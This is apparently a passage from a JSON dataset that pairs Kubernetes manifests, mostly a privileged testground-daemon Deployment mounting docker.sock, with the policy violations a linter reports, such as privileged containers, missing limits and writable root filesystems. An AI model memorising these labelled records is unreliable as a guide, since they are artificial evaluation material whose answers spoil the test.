    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-sriov-device-plugin-amd64\n  namespace: kube-system\n  labels:\n    tier: node\n    app: sriovdp\nspec:\n  selector:\n    matchLabels:\n      name: sriov-device-plugin\n  template:\n    metadata:\n      labels:\n        name: sriov-device-plugin\n        tier: node\n        app: sriovdp\n    spec:\n      serviceAccountName: sriov-device-plugin\n      containers:\n      - name: kube-sriovdp\n        image: docker.io/nfvpe/sriov-device-plugin:v3.1\n        imagePullPolicy: Never\n        args:\n        - --log-dir=sriovdp\n        - --log-level=10\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - name: devicesock\n          mountPath: /var/lib/kubelet/\n          readOnly: false\n        - name: log\n          mountPath: /var/log\n        - name: config-volume\n          mountPath: /etc/pcidp\n      volumes:\n      - name: devicesock\n        hostPath:\n          path: /var/lib/kubelet/\n      - name: log\n        hostPath:\n          path: /var/log\n      - name: config-volume\n        configMap:\n          name: sriovdp-config\n          items:\n          - key: config.json\n            path: config.json\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"kube-sriovdp\" has cpu request 0"
  },
  {
    "id": "04030",
    "manifest_path": "data/manifests/the_stack_sample/sample_1812.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-sriov-device-plugin-amd64\n  namespace: kube-system\n  labels:\n    tier: node\n    app: sriovdp\nspec:\n  selector:\n    matchLabels:\n      name: sriov-device-plugin\n  template:\n    metadata:\n      labels:\n        name: sriov-device-plugin\n        tier: node\n        app: sriovdp\n    spec:\n      serviceAccountName: sriov-device-plugin\n      containers:\n      - name: kube-sriovdp\n        image: docker.io/nfvpe/sriov-device-plugin:v3.1\n        imagePullPolicy: Never\n        args:\n        - --log-dir=sriovdp\n        - --log-level=10\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - name: devicesock\n          mountPath: /var/lib/kubelet/\n          readOnly: false\n        - name: log\n          mountPath: /var/log\n        - name: config-volume\n          mountPath: /etc/pcidp\n      volumes:\n      - name: devicesock\n        hostPath:\n          path: /var/lib/kubelet/\n      - name: log\n        hostPath:\n          path: /var/log\n      - name: config-volume\n        configMap:\n          name: sriovdp-config\n          items:\n          - key: config.json\n            path: config.json\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kube-sriovdp\" has memory limit 0"
  },
  {
    "id": "04031",
    "manifest_path": "data/manifests/the_stack_sample/sample_1816.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: testground-daemon\n  labels:\n    app: testground-daemon\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: testground-daemon\n  template:\n    metadata:\n      labels:\n        app: testground-daemon\n    spec:\n      serviceAccountName: testground-daemon\n      initContainers:\n      - name: iproute-add\n        image: busybox:1.31.1\n        securityContext:\n          privileged: true\n        command:\n        - sh\n        - -ac\n        - 'while [ \"$GW\" = \"\" ]; do export GW=$(ip route | grep cni0 | awk ''{print\n          $7}''); echo \"Got GW: $GW\"; sleep 5; done; echo $GW && ip route && ip route\n          add 100.64.0.0/16 via $GW && ip route || true;\n\n          '\n      containers:\n      - name: goproxy\n        image: iptestground/goproxy:2.0.2\n        ports:\n        - containerPort: 8081\n          hostPort: 8081\n        volumeMounts:\n        - name: envtoml\n          mountPath: /root/testground/.env.toml\n          subPath: .env.toml\n        - name: efs-pvc\n          mountPath: /go\n        resources:\n          requests:\n            memory: 512Mi\n            cpu: 500m\n          limits:\n            memory: 512Mi\n      - name: testground-daemon\n        image: iptestground/testground:edge\n        imagePullPolicy: Always\n        env:\n        - name: REDIS_HOST\n          value: testground-infra-redis-headless\n        securityContext:\n          privileged: true\n        ports:\n        - containerPort: 8042\n          hostPort: 8042\n        volumeMounts:\n        - name: daemon-datadir\n          mountPath: /root/testground/\n        - name: efs-pvc\n          mountPath: /efs\n        - name: dockersock\n          mountPath: /var/run/docker.sock\n        - name: envtoml\n          mountPath: /root/testground/.env.toml\n          subPath: .env.toml\n        resources:\n          requests:\n            memory: 2048Mi\n            cpu: 2000m\n          limits:\n            memory: 2048Mi\n      volumes:\n      - name: efs-pvc\n        persistentVolumeClaim:\n          claimName: efs\n      - name: daemon-datadir\n        persistentVolumeClaim:\n          claimName: testground-daemon-datadir-pvc\n      - name: dockersock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: envtoml\n        configMap:\n          name: env-toml-cfg\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"goproxy\" does not have a read-only root file system"
  },
  {
    "id": "04032",
    "manifest_path": "data/manifests/the_stack_sample/sample_1816.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: testground-daemon\n  labels:\n    app: testground-daemon\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: testground-daemon\n  template:\n    metadata:\n      labels:\n        app: testground-daemon\n    spec:\n      serviceAccountName: testground-daemon\n      initContainers:\n      - name: iproute-add\n        image: busybox:1.31.1\n        securityContext:\n          privileged: true\n        command:\n        - sh\n        - -ac\n        - 'while [ \"$GW\" = \"\" ]; do export GW=$(ip route | grep cni0 | awk ''{print\n          $7}''); echo \"Got GW: $GW\"; sleep 5; done; echo $GW && ip route && ip route\n          add 100.64.0.0/16 via $GW && ip route || true;\n\n          '\n      containers:\n      - name: goproxy\n        image: iptestground/goproxy:2.0.2\n        ports:\n        - containerPort: 8081\n          hostPort: 8081\n        volumeMounts:\n        - name: envtoml\n          mountPath: /root/testground/.env.toml\n          subPath: .env.toml\n        - name: efs-pvc\n          mountPath: /go\n        resources:\n          requests:\n            memory: 512Mi\n            cpu: 500m\n          limits:\n            memory: 512Mi\n      - name: testground-daemon\n        image: iptestground/testground:edge\n        imagePullPolicy: Always\n        env:\n        - name: REDIS_HOST\n          value: testground-infra-redis-headless\n        securityContext:\n          privileged: true\n        ports:\n        - containerPort: 8042\n          hostPort: 8042\n        volumeMounts:\n        - name: daemon-datadir\n          mountPath: /root/testground/\n        - name: efs-pvc\n          mountPath: /efs\n        - name: dockersock\n          mountPath: /var/run/docker.sock\n        - name: envtoml\n          mountPath: /root/testground/.env.toml\n          subPath: .env.toml\n        resources:\n          requests:\n            memory: 2048Mi\n            cpu: 2000m\n          limits:\n            memory: 2048Mi\n      volumes:\n      - name: efs-pvc\n        persistentVolumeClaim:\n          claimName: efs\n      - name: daemon-datadir\n        persistentVolumeClaim:\n          claimName: testground-daemon-datadir-pvc\n      - name: dockersock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: envtoml\n        configMap:\n          name: env-toml-cfg\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"iproute-add\" does not have a read-only root file system"
  },
  {
    "id": "04033",
    "manifest_path": "data/manifests/the_stack_sample/sample_1816.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: testground-daemon\n  labels:\n    app: testground-daemon\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: testground-daemon\n  template:\n    metadata:\n      labels:\n        app: testground-daemon\n    spec:\n      serviceAccountName: testground-daemon\n      initContainers:\n      - name: iproute-add\n        image: busybox:1.31.1\n        securityContext:\n          privileged: true\n        command:\n        - sh\n        - -ac\n        - 'while [ \"$GW\" = \"\" ]; do export GW=$(ip route | grep cni0 | awk ''{print\n          $7}''); echo \"Got GW: $GW\"; sleep 5; done; echo $GW && ip route && ip route\n          add 100.64.0.0/16 via $GW && ip route || true;\n\n          '\n      containers:\n      - name: goproxy\n        image: iptestground/goproxy:2.0.2\n        ports:\n        - containerPort: 8081\n          hostPort: 8081\n        volumeMounts:\n        - name: envtoml\n          mountPath: /root/testground/.env.toml\n          subPath: .env.toml\n        - name: efs-pvc\n          mountPath: /go\n        resources:\n          requests:\n            memory: 512Mi\n            cpu: 500m\n          limits:\n            memory: 512Mi\n      - name: testground-daemon\n        image: iptestground/testground:edge\n        imagePullPolicy: Always\n        env:\n        - name: REDIS_HOST\n          value: testground-infra-redis-headless\n        securityContext:\n          privileged: true\n        ports:\n        - containerPort: 8042\n          hostPort: 8042\n        volumeMounts:\n        - name: daemon-datadir\n          mountPath: /root/testground/\n        - name: efs-pvc\n          mountPath: /efs\n        - name: dockersock\n          mountPath: /var/run/docker.sock\n        - name: envtoml\n          mountPath: /root/testground/.env.toml\n          subPath: .env.toml\n        resources:\n          requests:\n            memory: 2048Mi\n            cpu: 2000m\n          limits:\n            memory: 2048Mi\n      volumes:\n      - name: efs-pvc\n        persistentVolumeClaim:\n          claimName: efs\n      - name: daemon-datadir\n        persistentVolumeClaim:\n          claimName: testground-daemon-datadir-pvc\n      - name: dockersock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: envtoml\n        configMap:\n          name: env-toml-cfg\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"testground-daemon\" does not have a read-only root file system"
  },
  {
    "id": "04034",
    "manifest_path": "data/manifests/the_stack_sample/sample_1816.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: testground-daemon\n  labels:\n    app: testground-daemon\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: testground-daemon\n  template:\n    metadata:\n      labels:\n        app: testground-daemon\n    spec:\n      serviceAccountName: testground-daemon\n      initContainers:\n      - name: iproute-add\n        image: busybox:1.31.1\n        securityContext:\n          privileged: true\n        command:\n        - sh\n        - -ac\n        - 'while [ \"$GW\" = \"\" ]; do export GW=$(ip route | grep cni0 | awk ''{print\n          $7}''); echo \"Got GW: $GW\"; sleep 5; done; echo $GW && ip route && ip route\n          add 100.64.0.0/16 via $GW && ip route || true;\n\n          '\n      containers:\n      - name: goproxy\n        image: iptestground/goproxy:2.0.2\n        ports:\n        - containerPort: 8081\n          hostPort: 8081\n        volumeMounts:\n        - name: envtoml\n          mountPath: /root/testground/.env.toml\n          subPath: .env.toml\n        - name: efs-pvc\n          mountPath: /go\n        resources:\n          requests:\n            memory: 512Mi\n            cpu: 500m\n          limits:\n            memory: 512Mi\n      - name: testground-daemon\n        image: iptestground/testground:edge\n        imagePullPolicy: Always\n        env:\n        - name: REDIS_HOST\n          value: testground-infra-redis-headless\n        securityContext:\n          privileged: true\n        ports:\n        - containerPort: 8042\n          hostPort: 8042\n        volumeMounts:\n        - name: daemon-datadir\n          mountPath: /root/testground/\n        - name: efs-pvc\n          mountPath: /efs\n        - name: dockersock\n          mountPath: /var/run/docker.sock\n        - name: envtoml\n          mountPath: /root/testground/.env.toml\n          subPath: .env.toml\n        resources:\n          requests:\n            memory: 2048Mi\n            cpu: 2000m\n          limits:\n            memory: 2048Mi\n      volumes:\n      - name: efs-pvc\n        persistentVolumeClaim:\n          claimName: efs\n      - name: daemon-datadir\n        persistentVolumeClaim:\n          claimName: testground-daemon-datadir-pvc\n      - name: dockersock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: envtoml\n        configMap:\n          name: env-toml-cfg\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"iproute-add\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "04035",
    "manifest_path": "data/manifests/the_stack_sample/sample_1816.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: testground-daemon\n  labels:\n    app: testground-daemon\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: testground-daemon\n  template:\n    metadata:\n      labels:\n        app: testground-daemon\n    spec:\n      serviceAccountName: testground-daemon\n      initContainers:\n      - name: iproute-add\n        image: busybox:1.31.1\n        securityContext:\n          privileged: true\n        command:\n        - sh\n        - -ac\n        - 'while [ \"$GW\" = \"\" ]; do export GW=$(ip route | grep cni0 | awk ''{print\n          $7}''); echo \"Got GW: $GW\"; sleep 5; done; echo $GW && ip route && ip route\n          add 100.64.0.0/16 via $GW && ip route || true;\n\n          '\n      containers:\n      - name: goproxy\n        image: iptestground/goproxy:2.0.2\n        ports:\n        - containerPort: 8081\n          hostPort: 8081\n        volumeMounts:\n        - name: envtoml\n          mountPath: /root/testground/.env.toml\n          subPath: .env.toml\n        - name: efs-pvc\n          mountPath: /go\n        resources:\n          requests:\n            memory: 512Mi\n            cpu: 500m\n          limits:\n            memory: 512Mi\n      - name: testground-daemon\n        image: iptestground/testground:edge\n        imagePullPolicy: Always\n        env:\n        - name: REDIS_HOST\n          value: testground-infra-redis-headless\n        securityContext:\n          privileged: true\n        ports:\n        - containerPort: 8042\n          hostPort: 8042\n        volumeMounts:\n        - name: daemon-datadir\n          mountPath: /root/testground/\n        - name: efs-pvc\n          mountPath: /efs\n        - name: dockersock\n          mountPath: /var/run/docker.sock\n        - name: envtoml\n          mountPath: /root/testground/.env.toml\n          subPath: .env.toml\n        resources:\n          requests:\n            memory: 2048Mi\n            cpu: 2000m\n          limits:\n            memory: 2048Mi\n      volumes:\n      - name: efs-pvc\n        persistentVolumeClaim:\n          claimName: efs\n      - name: daemon-datadir\n        persistentVolumeClaim:\n          claimName: testground-daemon-datadir-pvc\n      - name: dockersock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: envtoml\n        configMap:\n          name: env-toml-cfg\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"testground-daemon\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "04036",
    "manifest_path": "data/manifests/the_stack_sample/sample_1816.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: testground-daemon\n  labels:\n    app: testground-daemon\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: testground-daemon\n  template:\n    metadata:\n      labels:\n        app: testground-daemon\n    spec:\n      serviceAccountName: testground-daemon\n      initContainers:\n      - name: iproute-add\n        image: busybox:1.31.1\n        securityContext:\n          privileged: true\n        command:\n        - sh\n        - -ac\n        - 'while [ \"$GW\" = \"\" ]; do export GW=$(ip route | grep cni0 | awk ''{print\n          $7}''); echo \"Got GW: $GW\"; sleep 5; done; echo $GW && ip route && ip route\n          add 100.64.0.0/16 via $GW && ip route || true;\n\n          '\n      containers:\n      - name: goproxy\n        image: iptestground/goproxy:2.0.2\n        ports:\n        - containerPort: 8081\n          hostPort: 8081\n        volumeMounts:\n        - name: envtoml\n          mountPath: /root/testground/.env.toml\n          subPath: .env.toml\n        - name: efs-pvc\n          mountPath: /go\n        resources:\n          requests:\n            memory: 512Mi\n            cpu: 500m\n          limits:\n            memory: 512Mi\n      - name: testground-daemon\n        image: iptestground/testground:edge\n        imagePullPolicy: Always\n        env:\n        - name: REDIS_HOST\n          value: testground-infra-redis-headless\n        securityContext:\n          privileged: true\n        ports:\n        - containerPort: 8042\n          hostPort: 8042\n        volumeMounts:\n        - name: daemon-datadir\n          mountPath: /root/testground/\n        - name: efs-pvc\n          mountPath: /efs\n        - name: dockersock\n          mountPath: /var/run/docker.sock\n        - name: envtoml\n          mountPath: /root/testground/.env.toml\n          subPath: .env.toml\n        resources:\n          requests:\n            memory: 2048Mi\n            cpu: 2000m\n          limits:\n            memory: 2048Mi\n      volumes:\n      - name: efs-pvc\n        persistentVolumeClaim:\n          claimName: efs\n      - name: daemon-datadir\n        persistentVolumeClaim:\n          claimName: testground-daemon-datadir-pvc\n      - name: dockersock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: envtoml\n        configMap:\n          name: env-toml-cfg\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"iproute-add\" is privileged"
  },
  {
    "id": "04037",
    "manifest_path": "data/manifests/the_stack_sample/sample_1816.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: testground-daemon\n  labels:\n    app: testground-daemon\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: testground-daemon\n  template:\n    metadata:\n      labels:\n        app: testground-daemon\n    spec:\n      serviceAccountName: testground-daemon\n      initContainers:\n      - name: iproute-add\n        image: busybox:1.31.1\n        securityContext:\n          privileged: true\n        command:\n        - sh\n        - -ac\n        - 'while [ \"$GW\" = \"\" ]; do export GW=$(ip route | grep cni0 | awk ''{print\n          $7}''); echo \"Got GW: $GW\"; sleep 5; done; echo $GW && ip route && ip route\n          add 100.64.0.0/16 via $GW && ip route || true;\n\n          '\n      containers:\n      - name: goproxy\n        image: iptestground/goproxy:2.0.2\n        ports:\n        - containerPort: 8081\n          hostPort: 8081\n        volumeMounts:\n        - name: envtoml\n          mountPath: /root/testground/.env.toml\n          subPath: .env.toml\n        - name: efs-pvc\n          mountPath: /go\n        resources:\n          requests:\n            memory: 512Mi\n            cpu: 500m\n          limits:\n            memory: 512Mi\n      - name: testground-daemon\n        image: iptestground/testground:edge\n        imagePullPolicy: Always\n        env:\n        - name: REDIS_HOST\n          value: testground-infra-redis-headless\n        securityContext:\n          privileged: true\n        ports:\n        - containerPort: 8042\n          hostPort: 8042\n        volumeMounts:\n        - name: daemon-datadir\n          mountPath: /root/testground/\n        - name: efs-pvc\n          mountPath: /efs\n        - name: dockersock\n          mountPath: /var/run/docker.sock\n        - name: envtoml\n          mountPath: /root/testground/.env.toml\n          subPath: .env.toml\n        resources:\n          requests:\n            memory: 2048Mi\n            cpu: 2000m\n          limits:\n            memory: 2048Mi\n      volumes:\n      - name: efs-pvc\n        persistentVolumeClaim:\n          claimName: efs\n      - name: daemon-datadir\n        persistentVolumeClaim:\n          claimName: testground-daemon-datadir-pvc\n      - name: dockersock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: envtoml\n        configMap:\n          name: env-toml-cfg\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"testground-daemon\" is privileged"
  },
  {
    "id": "04038",
    "manifest_path": "data/manifests/the_stack_sample/sample_1816.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: testground-daemon\n  labels:\n    app: testground-daemon\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: testground-daemon\n  template:\n    metadata:\n      labels:\n        app: testground-daemon\n    spec:\n      serviceAccountName: testground-daemon\n      initContainers:\n      - name: iproute-add\n        image: busybox:1.31.1\n        securityContext:\n          privileged: true\n        command:\n        - sh\n        - -ac\n        - 'while [ \"$GW\" = \"\" ]; do export GW=$(ip route | grep cni0 | awk ''{print\n          $7}''); echo \"Got GW: $GW\"; sleep 5; done; echo $GW && ip route && ip route\n          add 100.64.0.0/16 via $GW && ip route || true;\n\n          '\n      containers:\n      - name: goproxy\n        image: iptestground/goproxy:2.0.2\n        ports:\n        - containerPort: 8081\n          hostPort: 8081\n        volumeMounts:\n        - name: envtoml\n          mountPath: /root/testground/.env.toml\n          subPath: .env.toml\n        - name: efs-pvc\n          mountPath: /go\n        resources:\n          requests:\n            memory: 512Mi\n            cpu: 500m\n          limits:\n            memory: 512Mi\n      - name: testground-daemon\n        image: iptestground/testground:edge\n        imagePullPolicy: Always\n        env:\n        - name: REDIS_HOST\n          value: testground-infra-redis-headless\n        securityContext:\n          privileged: true\n        ports:\n        - containerPort: 8042\n          hostPort: 8042\n        volumeMounts:\n        - name: daemon-datadir\n          mountPath: /root/testground/\n        - name: efs-pvc\n          mountPath: /efs\n        - name: dockersock\n          mountPath: /var/run/docker.sock\n        - name: envtoml\n          mountPath: /root/testground/.env.toml\n          subPath: .env.toml\n        resources:\n          requests:\n            memory: 2048Mi\n            cpu: 2000m\n          limits:\n            memory: 2048Mi\n      volumes:\n      - name: efs-pvc\n        persistentVolumeClaim:\n          claimName: efs\n      - name: daemon-datadir\n        persistentVolumeClaim:\n          claimName: testground-daemon-datadir-pvc\n      - name: dockersock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: envtoml\n        configMap:\n          name: env-toml-cfg\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"goproxy\" is not set to runAsNonRoot"
  },
  {
    "id": "04039",
    "manifest_path": "data/manifests/the_stack_sample/sample_1816.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: testground-daemon\n  labels:\n    app: testground-daemon\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: testground-daemon\n  template:\n    metadata:\n      labels:\n        app: testground-daemon\n    spec:\n      serviceAccountName: testground-daemon\n      initContainers:\n      - name: iproute-add\n        image: busybox:1.31.1\n        securityContext:\n          privileged: true\n        command:\n        - sh\n        - -ac\n        - 'while [ \"$GW\" = \"\" ]; do export GW=$(ip route | grep cni0 | awk ''{print\n          $7}''); echo \"Got GW: $GW\"; sleep 5; done; echo $GW && ip route && ip route\n          add 100.64.0.0/16 via $GW && ip route || true;\n\n          '\n      containers:\n      - name: goproxy\n        image: iptestground/goproxy:2.0.2\n        ports:\n        - containerPort: 8081\n          hostPort: 8081\n        volumeMounts:\n        - name: envtoml\n          mountPath: /root/testground/.env.toml\n          subPath: .env.toml\n        - name: efs-pvc\n          mountPath: /go\n        resources:\n          requests:\n            memory: 512Mi\n            cpu: 500m\n          limits:\n            memory: 512Mi\n      - name: testground-daemon\n        image: iptestground/testground:edge\n        imagePullPolicy: Always\n        env:\n        - name: REDIS_HOST\n          value: testground-infra-redis-headless\n        securityContext:\n          privileged: true\n        ports:\n        - containerPort: 8042\n          hostPort: 8042\n        volumeMounts:\n        - name: daemon-datadir\n          mountPath: /root/testground/\n        - name: efs-pvc\n          mountPath: /efs\n        - name: dockersock\n          mountPath: /var/run/docker.sock\n        - name: envtoml\n          mountPath: /root/testground/.env.toml\n          subPath: .env.toml\n        resources:\n          requests:\n            memory: 2048Mi\n            cpu: 2000m\n          limits:\n            memory: 2048Mi\n      volumes:\n      - name: efs-pvc\n        persistentVolumeClaim:\n          claimName: efs\n      - name: daemon-datadir\n        persistentVolumeClaim:\n          claimName: testground-daemon-datadir-pvc\n      - name: dockersock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: envtoml\n        configMap:\n          name: env-toml-cfg\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"iproute-add\" is not set to runAsNonRoot"
  },
  {
    "id": "04040",
    "manifest_path": "data/manifests/the_stack_sample/sample_1816.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: testground-daemon\n  labels:\n    app: testground-daemon\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: testground-daemon\n  template:\n    metadata:\n      labels:\n        app: testground-daemon\n    spec:\n      serviceAccountName: testground-daemon\n      initContainers:\n      - name: iproute-add\n        image: busybox:1.31.1\n        securityContext:\n          privileged: true\n        command:\n        - sh\n        - -ac\n        - 'while [ \"$GW\" = \"\" ]; do export GW=$(ip route | grep cni0 | awk ''{print\n          $7}''); echo \"Got GW: $GW\"; sleep 5; done; echo $GW && ip route && ip route\n          add 100.64.0.0/16 via $GW && ip route || true;\n\n          '\n      containers:\n      - name: goproxy\n        image: iptestground/goproxy:2.0.2\n        ports:\n        - containerPort: 8081\n          hostPort: 8081\n        volumeMounts:\n        - name: envtoml\n          mountPath: /root/testground/.env.toml\n          subPath: .env.toml\n        - name: efs-pvc\n          mountPath: /go\n        resources:\n          requests:\n            memory: 512Mi\n            cpu: 500m\n          limits:\n            memory: 512Mi\n      - name: testground-daemon\n        image: iptestground/testground:edge\n        imagePullPolicy: Always\n        env:\n        - name: REDIS_HOST\n          value: testground-infra-redis-headless\n        securityContext:\n          privileged: true\n        ports:\n        - containerPort: 8042\n          hostPort: 8042\n        volumeMounts:\n        - name: daemon-datadir\n          mountPath: /root/testground/\n        - name: efs-pvc\n          mountPath: /efs\n        - name: dockersock\n          mountPath: /var/run/docker.sock\n        - name: envtoml\n          mountPath: /root/testground/.env.toml\n          subPath: .env.toml\n        resources:\n          requests:\n            memory: 2048Mi\n            cpu: 2000m\n          limits:\n            memory: 2048Mi\n      volumes:\n      - name: efs-pvc\n        persistentVolumeClaim:\n          claimName: efs\n      - name: daemon-datadir\n        persistentVolumeClaim:\n          claimName: testground-daemon-datadir-pvc\n      - name: dockersock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: envtoml\n        configMap:\n          name: env-toml-cfg\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"testground-daemon\" is not set to runAsNonRoot"
  },
  {
    "id": "04041",
    "manifest_path": "data/manifests/the_stack_sample/sample_1816.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: testground-daemon\n  labels:\n    app: testground-daemon\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: testground-daemon\n  template:\n    metadata:\n      labels:\n        app: testground-daemon\n    spec:\n      serviceAccountName: testground-daemon\n      initContainers:\n      - name: iproute-add\n        image: busybox:1.31.1\n        securityContext:\n          privileged: true\n        command:\n        - sh\n        - -ac\n        - 'while [ \"$GW\" = \"\" ]; do export GW=$(ip route | grep cni0 | awk ''{print\n          $7}''); echo \"Got GW: $GW\"; sleep 5; done; echo $GW && ip route && ip route\n          add 100.64.0.0/16 via $GW && ip route || true;\n\n          '\n      containers:\n      - name: goproxy\n        image: iptestground/goproxy:2.0.2\n        ports:\n        - containerPort: 8081\n          hostPort: 8081\n        volumeMounts:\n        - name: envtoml\n          mountPath: /root/testground/.env.toml\n          subPath: .env.toml\n        - name: efs-pvc\n          mountPath: /go\n        resources:\n          requests:\n            memory: 512Mi\n            cpu: 500m\n          limits:\n            memory: 512Mi\n      - name: testground-daemon\n        image: iptestground/testground:edge\n        imagePullPolicy: Always\n        env:\n        - name: REDIS_HOST\n          value: testground-infra-redis-headless\n        securityContext:\n          privileged: true\n        ports:\n        - containerPort: 8042\n          hostPort: 8042\n        volumeMounts:\n        - name: daemon-datadir\n          mountPath: /root/testground/\n        - name: efs-pvc\n          mountPath: /efs\n        - name: dockersock\n          mountPath: /var/run/docker.sock\n        - name: envtoml\n          mountPath: /root/testground/.env.toml\n          subPath: .env.toml\n        resources:\n          requests:\n            memory: 2048Mi\n            cpu: 2000m\n          limits:\n            memory: 2048Mi\n      volumes:\n      - name: efs-pvc\n        persistentVolumeClaim:\n          claimName: efs\n      - name: daemon-datadir\n        persistentVolumeClaim:\n          claimName: testground-daemon-datadir-pvc\n      - name: dockersock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: envtoml\n        configMap:\n          name: env-toml-cfg\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"iproute-add\" has cpu request 0"
  },
  {
    "id": "04042",
    "manifest_path": "data/manifests/the_stack_sample/sample_1816.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: testground-daemon\n  labels:\n    app: testground-daemon\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: testground-daemon\n  template:\n    metadata:\n      labels:\n        app: testground-daemon\n    spec:\n      serviceAccountName: testground-daemon\n      initContainers:\n      - name: iproute-add\n        image: busybox:1.31.1\n        securityContext:\n          privileged: true\n        command:\n        - sh\n        - -ac\n        - 'while [ \"$GW\" = \"\" ]; do export GW=$(ip route | grep cni0 | awk ''{print\n          $7}''); echo \"Got GW: $GW\"; sleep 5; done; echo $GW && ip route && ip route\n          add 100.64.0.0/16 via $GW && ip route || true;\n\n          '\n      containers:\n      - name: goproxy\n        image: iptestground/goproxy:2.0.2\n        ports:\n        - containerPort: 8081\n          hostPort: 8081\n        volumeMounts:\n        - name: envtoml\n          mountPath: /root/testground/.env.toml\n          subPath: .env.toml\n        - name: efs-pvc\n          mountPath: /go\n        resources:\n          requests:\n            memory: 512Mi\n            cpu: 500m\n          limits:\n            memory: 512Mi\n      - name: testground-daemon\n        image: iptestground/testground:edge\n        imagePullPolicy: Always\n        env:\n        - name: REDIS_HOST\n          value: testground-infra-redis-headless\n        securityContext:\n          privileged: true\n        ports:\n        - containerPort: 8042\n          hostPort: 8042\n        volumeMounts:\n        - name: daemon-datadir\n          mountPath: /root/testground/\n        - name: efs-pvc\n          mountPath: /efs\n        - name: dockersock\n          mountPath: /var/run/docker.sock\n        - name: envtoml\n          mountPath: /root/testground/.env.toml\n          subPath: .env.toml\n        resources:\n          requests:\n            memory: 2048Mi\n            cpu: 2000m\n          limits:\n            memory: 2048Mi\n      volumes:\n      - name: efs-pvc\n        persistentVolumeClaim:\n          claimName: efs\n      - name: daemon-datadir\n        persistentVolumeClaim:\n          claimName: testground-daemon-datadir-pvc\n      - name: dockersock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: envtoml\n        configMap:\n          name: env-toml-cfg\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"iproute-add\" has memory limit 0"
  },
  {
    "id": "04043",
    "manifest_path": "data/manifests/the_stack_sample/sample_1819.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: shippingservice\nspec:\n  selector:\n    matchLabels:\n      app: shippingservice\n  template:\n    metadata:\n      labels:\n        app: shippingservice\n    spec:\n      containers:\n      - name: server\n        image: shippingservice\n        ports:\n        - containerPort: 50051\n        env:\n        - name: PORT\n          value: '50051'\n        readinessProbe:\n          periodSeconds: 5\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:50051\n        livenessProbe:\n          exec:\n            command:\n            - /bin/grpc_health_probe\n            - -addr=:50051\n        resources:\n          requests:\n            cpu: 100m\n            memory: 64Mi\n          limits:\n            cpu: 200m\n            memory: 128Mi\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"server\" is using an invalid container image, \"shippingservice\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "04044",
    "manifest_path": "data/manifests/the_stack_sample/sample_1819.yaml",
